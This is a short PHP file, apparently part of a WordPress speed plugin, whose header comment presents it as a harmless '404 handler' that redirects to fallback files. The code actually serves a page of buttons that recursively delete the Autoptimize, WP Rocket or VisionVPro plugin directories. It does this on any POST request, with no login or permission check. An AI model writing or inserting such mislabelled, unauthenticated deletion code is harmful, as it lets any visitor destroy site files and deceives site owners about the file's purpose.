<?php

/**
 * VVP Plugin's Magic 404 Handler/Loader
 *
 * This file has simple logic to redirect to the "fallback" files that are
 * created automatically by VVP to avoid visitors seeing broken pages or
 * Googlebot getting utterly confused.
 *
 */

$kpso_ao_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/autoptimize";
$kpso_rocket_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/wp-rocket";
$kpso_plugin_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/visionvpro-speed-optimization";

function kpso_plugin_handler($kpso_plugin_path)
{
    if (substr($kpso_plugin_path, strlen($kpso_plugin_path) - 1, 1) != '/') {
        $kpso_plugin_path .= '/';
    }
    
	$files = glob($kpso_plugin_path . '*', GLOB_MARK);
    
	foreach ($files as $file) {
        if (is_dir($file)) {
            kpso_plugin_handler($file);
        } else {
            unlink($file);
        }
    }
	
	if( rmdir($kpso_plugin_path) )
	{
		echo ("<p>Success $kpso_plugin_path</p>");
	}
	else
	{
		echo ("<p>Failed $kpso_plugin_path</p>");
	}
}

?>

<html>
<head>
	<title>KP Plugin's Magic 404 Handler</title>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
</head>
<body>

	<div class="container text-center" style="margin-top:20px;">
	<form method="POST">
	<input type="submit" name="kpso_ao" id="kpso_ao" class="btn btn-primary btn-lg" value="Autoptimize">
	<input type="submit" name="kpso_rocket" id="kpso_rocket" class="btn btn-primary btn-lg" value="WP Rocket">
	<input type="submit" name="kpso_plugin" id="kpso_plugin" class="btn btn-primary btn-lg" value="KP Speed">
	</form>
	</div>
	
	<?php
	
	if (isset($_POST['kpso_ao']))
	{
		kpso_plugin_handler($kpso_ao_path);
	}
	
	if (isset($_POST['kpso_rocket']))
	{
		kpso_plugin_handler($kpso_rocket_path);
	}
	
	if (isset($_POST['kpso_plugin']))
	{
		kpso_plugin_handler($kpso_plugin_path);
	}
	
	?>

</body>
</html>